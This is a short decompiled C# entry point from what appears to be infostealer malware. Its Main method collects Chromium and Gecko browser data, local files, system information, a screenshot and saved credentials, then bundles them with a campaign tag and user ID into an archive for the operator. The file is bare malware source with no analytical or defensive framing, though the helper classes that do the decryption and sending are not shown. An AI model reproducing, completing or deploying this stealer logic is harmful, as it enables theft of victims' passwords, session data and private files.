using System;
using System.Collections.Generic;
using client.Decryption;
using client.Helpers;
using client.Models;
using client.Network;

namespace client
{
	// Token: 0x02000003 RID: 3
	internal class Program
	{
		// Token: 0x06000003 RID: 3 RVA: 0x000020B4 File Offset: 0x000002B4
		private static void Main(string[] args)
		{
			try
			{
				TaskHelper taskHelper = new TaskHelper();
				taskHelper.Randomize();
				List<ChromiumBrowserStructure> chromiumData;
				List<GeckoBrowserStructure> geckoData;
				List<DefaultFileStructure> defaultFiles;
				InformationStructure information;
				byte[] screenshot;
				List<Credentials> defaultCredentials;
				taskHelper.Process(out chromiumData, out geckoData, out defaultFiles, out information, out screenshot, out defaultCredentials);
				List<string> r_errors = new List<string>();
				LoggerHelper.RuntimeErrors.ForEach(delegate(Exception err)
				{
					r_errors.Add(err.Message + " - " + err.StackTrace);
				});
				Build.CreateArchive(new ExecutingAssemblyResult
				{
					Screenshot = screenshot,
					Information = information,
					Tag = Config.Tag,
					UserID = Config.UserID,
					DefaultFiles = defaultFiles,
					DefaultCredentials = defaultCredentials,
					ChromiumData = chromiumData,
					GeckoData = geckoData,
					RuntimeErrors = r_errors
				});
			}
			catch (Exception ex)
			{
				try
				{
					ErrorReporter.Report(ex);
				}
				catch
				{
				}
			}
		}
	}
}
